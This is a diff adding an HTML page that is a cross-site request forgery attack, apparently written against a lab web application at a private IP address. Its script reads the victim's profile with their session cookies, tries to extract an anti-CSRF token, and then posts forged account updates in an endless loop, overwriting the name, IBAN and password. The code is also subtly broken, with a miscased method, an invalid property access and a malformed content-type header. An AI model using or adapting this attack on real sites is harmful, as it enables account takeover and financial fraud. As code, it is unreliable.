@@ -1,0 +1,37 @@
+<html> 
+<body>
+CSRF WORKED
+<Script>
+//retrieve response and extract token
+
+var rqst= new XMLHttpRequest();
+var rqst2= new XMLHttpRequest();
+
+rqst.open("GET","http://10.100.13.37/profile", false);
+rqst.withCredentials=true
+
+rqst.onprogress = function() {
+    if (rqst.readyState === 4) {
+        if(rqst.status === 200 || rqst.status == 0){
+            var stolenToken = rqst.responseText;
+            var sendcsrf = stolenToken.indexof("acdt67gshfuiuasfsg");
+            stolenToken= stolenToken.substring(sendcsrf.stolenToken.length).substr(27,32);
+        }
+    }
+    }
+rqst.send(null);
+
+while(true) {
+    //csrf applied on update profile
+    rqst2.open("POST","http://10.100.13.37/update-user", false);
+    rqst2.withCredentials=true
+    var parameters = "name=abdullah&surname=1&email=a%40a.com&street_address=dzxvb&city=Berlin&zip=14251&iban=13513tg1g134hg&password=123456&uID=1&acdt67gshfuiuasfsg=40c48dab939a482f04dcecde07e27de6"+stolenToken;
+    rqst2.setRequestHeader("Content-type","application/x=www=form-urlencoded");
+    rqst2.setRequestHeader("Content-length", parameters.length);
+    rqst2.send(parameters);
+
+}
+
+</Script>
+</body>
+</html>
